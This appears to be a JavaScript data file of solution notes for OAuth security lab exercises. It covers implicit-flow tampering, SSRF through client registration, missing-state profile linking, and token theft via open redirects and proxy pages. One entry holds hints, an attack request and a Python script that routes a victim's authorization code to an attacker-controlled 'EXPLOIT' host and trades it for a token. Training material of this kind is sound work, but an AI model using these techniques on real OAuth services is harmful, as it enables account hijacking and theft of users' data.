export default {
  'oauth-lab-oauth-authentication-bypass-via-oauth-implicit-flow': {
    note: 'The implicit flow returns profile data in the URL fragment; edit the email to the victim\'s and the client logs you in as them.'
  },
  'oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration': {
    note: 'Registration accepts a `logo_uri`/`jwks_uri`; point it at an internal metadata endpoint to prove SSRF.'
  },
  'oauth-lab-oauth-forced-oauth-profile-linking': {
    note: 'The link flow has no `state`; trick the victim into linking your social account, then log in as them.'
  },
  'oauth-lab-oauth-account-hijacking-via-redirect-uri': {
    note: '`redirect_uri` is validated by prefix/substring; point it at your server and steal the victim\'s code.',
    work: {
      hints: [
        'Start the social login flow and inspect the `redirect_uri` parameter. Try appending a path or changing the host.',
        'The allow-list accepts a registered prefix, so `https://LAB/oauth-callback/../attacker` or an attacker subdomain may pass.',
        'Send the victim the authorization URL with your redirect target, then use the code at the client\'s callback.'
      ],
      approach:
        'Redirect URI validation is a string comparison rather than a URI comparison. The authorization server sends the authorization code to an attacker-controlled destination; the attacker exchanges it for a token and reads the victim\'s profile.',
      request: `GET /auth?client_id=CLIENT&redirect_uri=https%3A%2F%2FEXPLOIT%2Fcallback&response_type=code&scope=openid%20profile%20email&state=x HTTP/1.1
Host: oauth-server.example
Cookie: session=VICTIM-SESSION`,
      tokens: [
        ['client_id', 'Identifies the registered client; the redirect allow-list is per client.'],
        ['redirect_uri', 'The trust decision. It must match a registered URI exactly.'],
        ['EXPLOIT', 'An attacker host or a path that normalises outside the registered callback.'],
        ['response_type=code', 'Authorization code flow; the code is short-lived but exchangeable server-side.'],
        ['state=x', 'If the client does not validate it, the attacker can supply any value.'],
        ['(code)', 'Delivered to the attacker, then exchanged at the token endpoint with the client secret or PKCE verifier.']
      ],
      script: `import sys, requests, urllib.parse

host, exploit, client = sys.argv[1], sys.argv[2], sys.argv[3]
auth = f"https://{host}/auth?" + urllib.parse.urlencode({
    "client_id": client,
    "redirect_uri": f"https://{exploit}/callback",
    "response_type": "code",
    "scope": "openid profile email",
    "state": "x",
})
print("Send the victim this URL:", auth)
code = input("Paste the code from your listener: ").strip()
r = requests.post(f"https://{host}/token", data={
    "grant_type": "authorization_code", "code": code,
    "redirect_uri": f"https://{exploit}/callback", "client_id": client,
}, timeout=20)
print(r.status_code, r.text[:300])`
    }
  },
  'oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect': {
    note: 'The registered redirect URI has an open redirect; the token in the fragment is forwarded to the attacker.'
  },
  'oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page': {
    note: 'A client page proxies an arbitrary URL and can read the fragment; embed the OAuth redirect in it.'
  }
}
